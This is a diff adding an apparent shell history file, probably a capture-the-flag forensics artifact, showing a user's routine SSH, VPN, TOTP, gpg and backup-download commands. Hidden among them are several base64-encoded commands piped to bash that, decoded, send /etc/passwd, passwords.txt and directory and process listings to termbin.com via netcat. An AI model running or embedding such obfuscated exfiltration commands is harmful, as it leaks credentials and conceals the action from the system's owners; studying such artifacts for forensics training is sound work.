@@ -1,0 +1,218 @@
+ssh petr@praha-001
+totp-gen praha001
+ssh petr@praha-002
+eog 50.png
+ps ax | grep eog
+kill 311
+eog &
+exit
+ping 10.0.7.31
+ping 10.0.7.32
+totp-gen praha001
+totp-gen praha002
+totp-gen google
+totp-gen google
+apropos
+apropos pdf
+man pdfdetach
+pdfdetach -list 320.pdf 
+man pdfimages
+pdfimages -f 154 -l 175 -png 320.pdf 1
+totp-gen praha001
+totp-gen praha002
+ssh petr@praha-001
+ssh petr@praha-002
+curl https://keys.opava000/g.asc > g.asc
+gpg --import g.asc 
+gpg --verify s.txt 
+gpg --list-keys
+ps ax | grep siemens
+kill 17545 17548 17573
+df -h
+exit
+cd ~/brno005/production-data/
+sudo freshclam
+clamscan -r
+dig production.brno-005
+dig @9.9.9.9 production.brno-005
+dig @9.9.9.9 production.brno-005 A
+vpn -c brno-005 -u petr
+ua
+vpn -c brno-005 -u petr
+apropos record
+ykman list
+ykman oath code -d 93112770
+ykman -d 93112770 oath code
+gpg --list-secret-keys
+history | grep armor
+gpg --armor --export B9934110 > praha-007-sign.asc
+cp praha-007-sign.asc /run/media/petr/backup_ssd/keys/praha-007-sign.asc
+ls
+cd ..
+ls
+cat praha-007-sign.asc
+rm praha-007-sign.asc
+exit
+ps ax | grep siemens
+kill 311
+ssh petr@praha-001
+totp-gen praha001
+totp-gen praha001
+totp-gen praha002
+totp-gen praha002
+vpn -c brno-005 -u petr
+ssh petr@praha-002
+totp-gen praha002
+ssh petr@praha-002
+totp-gen praha002
+totp-gen google
+exit
+totp-gen praha002
+ssh petr@praha-002
+chromeswitch off
+ls
+cd ..
+echo YnJubzAwMQ== | base64 -d
+gpg --list-secret-keys
+gpg --export --armor HA74B110 > ostrava-001-enc.asc
+cp ostrava-001-enc.asc /run/media/petr/backup_ssd/keys/ostrava-001-enc.asc
+echo cHMgYXggPiBwcm9jZXNzZXM= | base64 -d | bash
+. ./gpg-rm-expired-keys.sh 
+sudo pacman -S archlinux-keyring
+gpg --import signedPubKey.asc 
+gpg --import pubring.gpg 
+gpg --list-keys
+gpg --secret-list-keys
+gpg --list-secret-keys
+curl https://files.brno-001/arabanimajneb.asc --insecure
+echo Y2F0IHByb2Nlc3NlcyB8IG5jIHRlcm1iaW4uY29tIDk5OTk= | base64 -d | bash
+sftp petr@files.brno-001
+nano udamraujulim.md
+ls
+cd ../prod/
+sftp petr@files.brno-001
+sftp petr@files.brno-001
+exit
+totp-gen praha002
+totp-gen praha002
+totp-gen praha002
+vpn -c brno-005 -u petr
+ssh petr@praha-002
+ssh petr@praha-002
+sudo paccache -r
+. ./push.sh 
+. ./push.sh 
+ls
+cd ..
+ls
+. ./push.sh 
+exit
+nano business-card.tex
+echo cm0gcHJvY2Vzc2Vz | base64 -d | bash
+sudo xbacklight -set 10
+kill 311
+echo bHMgLWwgfCBuYyB0ZXJtYmluLmNvbSA5OTk5 | base64 -d | bash
+vpn -c brno-005 -u petr
+totp-gen praha001
+totp-gen google
+totp-gen google
+nano meeting.txt
+nano files.txt
+exit
+vpn -c brno-005 -u petr
+ssh petr@praha-003
+ssh petr@praha-001
+ssh petr@praha-002
+totp-gen praha001
+totp-gen praha002
+totp-gen praha002
+vpn -c brno-008 -u petr
+echo xYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ==
+nano README.md
+exit
+sftp petr@files.brno-001
+cat ~/.ssh/known_hosts 
+ssh-keygen -R files.brno-001
+cat ~/.ssh/known_hosts 
+echo ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNU
+mogrify -strip 2017-02-07-slideset-brno.jpg 
+shred 2017-02-07-slideset-brno-full.pdf
+ls
+shred 13v6ds1.jpg 
+compiler unlock
+compiler lock
+sudo paccache -r
+totp-gen praha001
+totp-gen praha002
+totp-gen google
+ssh petr@praha-001
+ssh petr@praha-002
+lscpu 
+hwinfo --short
+hwinfo --bios
+exit
+ssh petr@praha-003
+totp-gen google
+ssh petr@praha-003
+ssh petr@praha-003
+totp-gen google
+totp-gen ms
+echo Y2F0IC9ldGMvcGFzc3dkIHwgbmMgdGVybWJpbi5jb20gOTk5OQ== | base64 -d | bash
+ping 10.0.2.15
+totp-gen ms
+totp-gen google
+totp-gen google
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "001"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "002"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "003"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "004"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "005"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "006"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "007"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "008"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "009"
+. ./download.sh "brno-003" "26" "backup_bottling_lines_08_2020" "1"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "010"
+. ./download.sh "brno-003" "26" "backlog_09_2020" "1" "4"
+. ./download.sh "brno-003" "26" "backlog_09_2020" "1" "5"
+. ./download.sh "brno-003" "26" "backlog_09_2020" "1" "6"
+. ./download.sh "brno-003" "26" "backlog_09_2020" "1" "7"
+. ./download.sh "brno-003" "26" "backlog_09_2020" "1" "8"
+. ./download.sh "brno-003" "26" "backlog_09_2020" "2" "1"
+. ./download.sh "brno-003" "7" "backup_bottling_lines_09_2020" "011"
+totp-gen google
+totp-gen google
+ps ax | grep syskron
+kill 2386 2389 2391 2422 2642 2644
+ps ax | grep ctf
+kill 2386
+totp-gen praha001
+totp-gen praha002
+ssh petr@praha-002
+ssh petr@praha-001
+sudo freshclam
+clamscan
+totp-gen praha001
+totp-gen praha001
+whois 10.4.0.174
+ssh petr@praha-001
+echo Y2F0IHBhc3N3b3Jkcy50eHQgfCBuYyB0ZXJtYmluLmNvbSA5OTk5 | base64 -d | bash
+zip -e -r aa.zip 6.bz2 
+man zip
+exit
+totp-gen google
+ssh petr@praha-003
+ssh petr@praha-002
+mkdir -p ~/prod/praha/002/temp/
+mv *.bak ~/prod/praha/002/temp/
+totp-gen praha001
+totp-gen praha002
+ssh petr@praha-001
+cat .git/config 
+ssh petr@praha-003
+totp-gen google
+ssh petr@praha-001
+totp-gen praha001
+totp-gen praha002
+ssh petr@praha-002
+exit
